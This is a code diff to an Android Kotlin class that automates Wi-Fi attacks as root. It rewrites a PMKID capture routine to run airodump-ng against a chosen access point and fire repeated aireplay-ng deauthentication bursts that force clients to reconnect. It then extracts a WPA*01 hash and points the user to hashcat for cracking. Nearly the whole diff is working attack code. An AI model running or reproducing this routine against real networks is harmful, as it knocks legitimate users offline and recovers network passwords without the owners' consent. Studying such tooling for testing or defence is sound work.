@@ -103,8 +103,15 @@ class WifiTools(context: Context) {
     /** Absolute path of a scratch log in the capture dir (for live tailing from the UI). */
     fun workFile(name: String): String = "$workDir/$name"
 
-    /** Current contents of a work file, for the output dialog to poll. */
+    /** Current contents of a work file, for the output view to poll. */
     fun readFile(abs: String): String = Root.run("cat '$abs' 2>/dev/null").out
+
+    /** Append a line of our own progress text to a work log (handshake capture narrates here). */
+    fun appendLog(abs: String, text: String) {
+        Root.run("printf '%s' ${shellQuote(text)} >> '$abs' 2>/dev/null")
+    }
+
+    private fun shellQuote(s: String): String = "'" + s.replace("'", "'\\''") + "'"
 
     /**
      * Run [cmd] (built with absolute tool paths) as root with cwd = capture dir. When
@@ -162,17 +169,28 @@ class WifiTools(context: Context) {
      * hash file lands in the capture dir on success.
      */
     fun pmkid(iface: String, bssid: String, channel: Int, secs: Int = 30, out: String? = null): String {
-        if (!hasTool("hcxdumptool") || !hasTool("hcxpcapngtool"))
-            return "hcxdumptool/hcxpcapngtool not installed."
-        val chan = channel.takeIf { it > 0 }?.let { "-c $it" } ?: ""
-        exec("rm -f pmkid.pcapng pmkid.22000 2>/dev/null")
-        runAttack("timeout $secs ${path("hcxdumptool")} -i $iface -w pmkid.pcapng $chan --rds=1", out)
-        exec("hcxpcapngtool -o pmkid.22000 pmkid.pcapng 2>/dev/null")
+        if (!hasTool("hcxpcapngtool")) return "hcxpcapngtool not installed."
+        if (!bssid.matches(MAC)) return "invalid bssid"
+        // The bundled hcxdumptool is broken on A14 bionic (TLS segment underaligned, won't
+        // load), so PMKID is captured with airodump instead: the PMKID rides in the AP's
+        // first EAPOL/association message, so airodump on the AP plus a deauth burst to force
+        // a client to reassociate exposes it; hcxpcapngtool then extracts the WPA*01 line.
+        val ch = channel.takeIf { it > 0 }?.let { "-c $it" } ?: "--band abg"
+        exec("rm -f pm-*.cap pm-*.csv pm-*.kismet* pmkid.22000 2>/dev/null")
+        exec("airodump-ng $iface $ch --bssid $bssid -w pm --write-interval 1 --output-format pcap,csv", bg = true)
+        // Stream the deauth nudges + wait into the log so the UI shows progress.
+        runAttack(
+            "sleep 3; for i in 1 2 3; do ${path("aireplay-ng")} -0 4 --ignore-negative-one " +
+                "-a $bssid $iface; sleep $secs; done", out
+        )
+        exec("pkill -f 'airodump-ng $iface .*-w pm' 2>/dev/null")
+        val cap = newest("pm-*.cap")
+        if (cap.isNotBlank()) exec("hcxpcapngtool -o pmkid.22000 '$cap' 2>/dev/null")
         val b = bssid.replace(":", "").lowercase()
         val hit = Root.run("grep -i '$b' '$workDir/pmkid.22000' 2>/dev/null | grep -c '^WPA\\*01'")
             .out.trim().toIntOrNull() ?: 0
         return if (hit > 0) "PMKID captured ✓ — $workDir/pmkid.22000 (crack with hashcat -m 22000)"
-        else "No PMKID in ${secs}s (AP may not expose one). Saved pmkid.pcapng."
+        else "No PMKID in ${secs}s (AP may not expose one, or no client reassociated)."
     }
 
     /**
